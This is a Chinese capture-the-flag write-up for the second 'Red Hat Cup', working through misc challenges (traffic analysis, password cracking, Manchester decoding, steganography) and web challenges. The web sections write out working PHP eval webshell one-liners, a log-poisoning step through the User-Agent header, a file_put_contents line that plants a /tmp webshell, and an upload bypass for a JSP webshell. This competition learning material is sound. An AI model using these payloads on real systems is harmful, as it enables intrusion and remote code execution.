网络安全攻防大赛第二届“红帽杯”网络安全攻防大赛（除了web3 guess id，不会做。没写。）

## misc2 Not Only Wireshark

下载流量包，wireshark打开，过滤查看http

发现name可疑，用python re全部提取出来  

![image.png](https://image.3001.net/images/20180503/15253336382864.png!small)  

504B0304，zip文件头了解一下  

![image.png](https://image.3001.net/images/20180503/15253336575457.png!small)

得到2.zip，打开发现需要密码

然后在流量包中ctrl+f搜索pass、pw、word、key，发现key有东西

  

使用?id=1128%23解密得到flag  

![image.png](https://image.3001.net/images/20180503/15253336751080.png!small)  

## misc3听说你们喜欢手工爆破

下载附件查看发现500个txt+1个带密码的rar，把所有txt提取出来，py查看文件内容，都是VGgzcjMgMXMgbjAgZjFhZw==，base64解密为Th3r3  
1s n0  
f1ag，以上两个都不是rar的密码。用py提取所有txt文件名作为字典，使用aapr跑字典爆破rar密码

![image.png](https://image.3001.net/images/20180503/15253336848252.png!small)  

  

![image.png](https://image.3001.net/images/20180503/1525333693494.png!small)  

解开压缩包，查看doc文档，发现仍有密码。

到52破解上下载一个aopr，跑doc密码，可打印字符从1位跑到6位，同时在想其他办法。发现aopr把密码跑出来了，5693

  

百度情系海边之城，得到提示为曼彻斯特编码，  

  

转为二进制得到  

\>\>\> s = '123654AAA678876303555111AAA77611A321'\>\>\>
bin(int(s,16))'0b100100011011001010100101010101010011001111000100001110110001100000011010101010101000100010001101010101010011101110110000100011010001100100001'  

  

对其进行手写曼彻斯特解码，发现00和11无法解密无法解密无法解密

百度ctf

曼彻斯特编码，在[https://bbs.ichunqiu.com/thread-8480-1-1.html](https://bbs.ichunqiu.com/thread-8480-1-1.html?from=beef)找到解码脚本

![image.png](https://image.3001.net/images/20180503/15253337439134.png!small)  

![image.png](https://image.3001.net/images/20180503/15253337474812.png!small)  

修改01对应为0或者1，得到两串结果  

![image.png](https://image.3001.net/images/20180503/15253337556909.png!small)  

其中5EFCF5F507AA5FAD77对应F5F507，提交通过。

审查脚本发现

![image.png](https://image.3001.net/images/20180503/15253337663908.png!small)  

这里面的else: r+='1'很有意思这里面的else: r+='1'很有意思这里面的else: r+='1'很有意思

怪不得我手写的会有00和11会解不出来

## misc4这是道web题？

下载附件，然后发呆，不知道要干嘛？

![image.png](https://image.3001.net/images/20180503/1525333777738.png!small)  

按时间排序、按大小排序、按类型排序，发现一堆文件。我知道这堆文件有问题但我就是不知何地该如何下手？有个ma1.jsp，但是有什么用？流量包全是http，跟yuncms有关系吗？什么东西？群里大佬一直在说的gif又是什么鬼，哪里来的gif？最近修改时间的图片都没找到问题啊？

问了出题人得到第一步，让我找webshell。

使用d盾WebShellKill扫一遍，发现companytplfiles.php有问题

![image.png](https://image.3001.net/images/20180503/1525333787213.png!small)  

让我去看流量包中的上传的东西，既然都是http，那就是post了  

![image.png](https://image.3001.net/images/20180503/15253337946458.png!small)  

在78466550-3fc1-11e8-9828-32001505e920.pcapng里面发现一个post包传了个图片  

![image.png](https://image.3001.net/images/20180503/152533380635.png!small)  

文件-导出对象-导出http，导出来  

![image.png](https://image.3001.net/images/20180503/15253338134551.png!small)  

1912kb的东西，把前面多余的东西删掉，保存为jpg  

![image.png](https://image.3001.net/images/20180503/15253338282291.png!small)  

binwalk分析，发现藏了个gif。原来群内大佬说的gif是这个  

![image.png](https://image.3001.net/images/20180503/15253338345634.png!small)  

使用foremost -v -i 2.jpg -o

./1.gif提取发现不全。我还以为是gif新隐写术。后来发现一千多kb的东西才提取出10kb，是提取不全，不是新隐写术。

![image.png](https://image.3001.net/images/20180503/1525333846144.png!small)  

使用dd if=2.jpg of=3 bs=1 skip=4380提取得到gif  

![image.png](https://image.3001.net/images/20180503/15253338559596.png!small)  

![image.png](https://image.3001.net/images/20180503/15253338596395.png!small)  

里面有些奇怪的html编码，百度gif 分离

在线，找到这个比较好用的<http://tu.sioe.cn/gj/fenjie/>

![image.png](https://image.3001.net/images/20180503/15253338726656.png!small)  

手抄一遍\&#102;&#108;&#97;&#103;&#123;&#83;&#48;&#50;&#50;&#121;&#52;&#111;&#114;&#114;&#53;&#125;Give  
Y0u

百度html  
解码，使用<http://www.convertstring.com/zh_CN/EncodeDecode/HtmlDecode>解码得到flag

![image.png](https://image.3001.net/images/20180503/15253338801203.png!small)  

站长那个html解码不好用。

吐槽：入口不明显入口不明显入口不明显。改成“这是道审计题？”会好一点？

## misc5问卷调查

做调查题拿flag

为了写wp专程回去重新做调查卷，然后再吐槽一遍。

## web1 simple upload

随便打帐号密码登录，发现返回了个set cookie: admin=0

![image.png](https://image.3001.net/images/20180503/15253339057765.png!small)  

用火狐插件cookie editor改cookie。（火狐插件Modify Headers应该也行）  

![image.png](https://image.3001.net/images/20180503/15253339164574.png!small)  

然后重新随便打个帐号密码登录，跳转到upload.html

上传一个像素的图片，上传成功

![image.png](https://image.3001.net/images/20180503/15253339264166.png!small)  

使用burpsuite重放  

![image.png](https://image.3001.net/images/20180503/15253339332386.png!small)  

修改后缀名为php然后上传发现上传成功  

![image.png](https://image.3001.net/images/20180503/15253339412951.png!small)  

那就传个一句话  

![image.png](https://image.3001.net/images/20180503/15253339482905.png!small)  

发现不解析  

![image.png](https://image.3001.net/images/20180503/15253339571197.png!small)  

然后乱试一通，在404页面发现tomcat  

![image.png](https://image.3001.net/images/20180503/15253339647729.png!small)  

然后传个jsp试一下。我这里往根目录传了。  

![image.png](https://image.3001.net/images/20180503/15253339733511.png!small)  

发现解析了  

![image.png](https://image.3001.net/images/20180503/15253339822441.png!small)  

那就传个菜刀shell呗  

![image.png](https://image.3001.net/images/20180503/15253339914463.png!small)  

在根目录下找到flag  

![image.png](https://image.3001.net/images/20180503/15253339972833.png!small)  

直接连菜刀也行，我只是装个x，假装自己不是脚本小子。  

直接连菜刀也行，我只是装个x，假装自己不是脚本小子。

## web2 shopping log

访问<http://120.132.95.234/>

\<!-- Site is tmvb.com --\>

![image.png](https://image.3001.net/images/20180503/15253340122864.png!small)  

改host访问。使用火狐插件Modify Headers、或者直接改hosts文件也行。

我这里直接burpsuite重放

乱改一通，把host改为[www.tmvb.com](http://www.tmvb.com)，进入下一关。

![image.png](https://image.3001.net/images/20180503/15253340226288.png!small)  

有了上一关的经验改referer为[www.dww.com](http://www.dww.com)  

![image.png](https://image.3001.net/images/20180503/15253340312197.png!small)  

给了个302 la_err.html

跟进去，说\<!-- Japan sales only --\>

![image.png](https://image.3001.net/images/20180503/15253340391611.png!small)  

然后该accept-language为ja，发现没什么用。把ja、jp、japan、japanese都试过了，都没什么鬼用。问了出题人是不是正则没写好？出题人说没问题。

…

后来突然发现我对着个html一通测试个啥？

回到index.php，再次访问

![image.png](https://image.3001.net/images/20180503/15253340476987.png!small)  

给了个302 5a560e50e61b552d34480017c7877467info.php，进入下一关  

![image.png](https://image.3001.net/images/20180503/15253340569651.png!small)  

![image.png](https://image.3001.net/images/20180503/1525334060210.png!small)  

写py爆破md5  

![image.png](https://image.3001.net/images/20180503/15253340686189.png!small)  

根据hint题目提示，从9999往0000爆破好一点。  

![image.png](https://image.3001.net/images/20180503/15253340767928.png!small)  

There's no such order.

好吧。开始爆破

![image.png](https://image.3001.net/images/20180503/1525334083111.png!small)  

写了一版去跑，每次请求都要爆破md5，1小时就跑200个number，问了出题人，出题人让我优化。

根据我多年的丰富的算法经验，发现时间都耗费在查md5爆破上，于是就生成了个彩虹表，直接查hash，快多了。（其实是直接被出题人打了，他问我不会跑彩虹表吗？）（肝个比赛整个人脑子都不灵活了）

用py做了个6位英文大小写+数字的md5前6位彩虹表，跑了两个小时还没生成完。赶紧暂停。发现光1/97就吃了我22g，差点把硬盘给搞炸了

![image.png](https://image.3001.net/images/20180503/15253340904819.png!small)  

然后做了个4位英文大小写+数字的md5前6位彩虹表，100多兆。  

![image.png](https://image.3001.net/images/20180503/15253340997489.png!small)  

再跑起来就快多了，两秒一个number。

在9588跑出flag

9588 Congradulations, your flag is flag{hong_mao_ctf_hajimaruyo}

## web4 biubiubiu

打开首页然后跳转到<http://zzz.game.ichunqiu.com/index.php?page=login.php>，测试发现有文件包含漏洞<http://zzz.game.ichunqiu.com/index.php?page=php://filter/convert.base64-encode/resource=login.php>。

接下来有两个思路，一是php文件包含日志文件getshell（<https://www.baidu.com/s?wd=php+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB+%E6%97%A5%E5%BF%97+getshell>），二是ssrf  
gopher打mysql exp。（方法二我试了一晚上，都没调成功。）

一通乱读，把源码都读完了，在login.php发现有conn.php，得到mysql帐号密码。

一通测试得到nginx配置文件/etc/nginx/nginx.conf（根据响应包的Server:  
nginx/1.10.2判断是nginx，刚好我vps装了apache和nginx于是就在我vps查看nginx配置文件路径了），得到日志文件路径/var/log/nginx/access.log

改user-agent，往日志文件插入一句话

![image.png](https://image.3001.net/images/20180503/15253341079063.png!small)  

然后文件保护查看日志发现多了一条php一句话

10.10.0.9 - - [30/Apr/2018:18:19:33 +0000] "GET / HTTP/1.0" 302 21 "-" "\<?php  
eval(\$_GET['cmd']);?\>"

（备注：为什么是改ua而不是改其他的呢？因为只能控制uri和ua和referer，其中uri会被url编码，变成10.10.0.9

  *     * [30/Apr/2018:18:18:53 +0000] "GET /?%3C?php%20eval(\$_GET[%27cmd%27]);?%3E  
HTTP/1.0" 302 21 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0)  
Gecko/20100101 Firefox/41.0"。uri我忘试了。）

然后可以直接菜刀连接。

我为了好看（强迫症），往/tmp/写了个一句话（其他路径www-data权限不可写），这样就不用包含日志，以免出错

/?page=/var/log/nginx/access.log\&cmd=file_put_contents(%22/tmp/s.php%22,%22%3C?php%20eval(\\\$_POST[%27cmd%27]);?%3E%22);

菜刀连接

![image.png](https://image.3001.net/images/20180503/15253341169225.png!small)  

连接数据库  

![image.png](https://image.3001.net/images/20180503/1525334125486.png!small)  

找到flag  

![image.png](https://image.3001.net/images/20180503/1525334133320.png!small)后来看群内大佬说这个是waf，拦菜刀的。我用的是之前官网放出的caidao-20160622-[www.maicaidao.com](http://www.maicaidao.com)（也是百度找的），直接就连上shell了。不明觉厉。现在官网指向127.0.0.1了，不知道下次是什么时候开。  

![image.png](https://image.3001.net/images/20180503/15253341413914.png!small)  

预期解法

<https://www.jianshu.com/p/6747fbc7b289>

记一次利用gopher的内网mysql盲注

# 总结

misc3非标准曼彻斯特编码是什么东西？

misc4？？？第一步怎么做？？？

web4 302返回gopher跳转可以绕过if(preg_match("/\^http(s?):\/\/.+/",  
\$url)){，然后调了一晚上的gopher打mysql，硬是打不成功。可能这就是我跟大佬的差距，还是要学习一个

<http://www.freebuf.com/articles/web/159342.html>

<https://paper.seebug.org/510/>

<https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2>

<https://www.jianshu.com/p/6747fbc7b289>

心疼我是个web狗

好饿 早知道不学web了

二进制一统江湖

是时候考虑一下转行的事情了

![image.png](https://image.3001.net/images/20180503/15253341546742.png!small)

有问题大家可以留言哦，也欢迎大家到春秋论坛中来耍一耍
[>>>点击跳转](https://bbs.ichunqiu.com/portal.php?from=beef)  

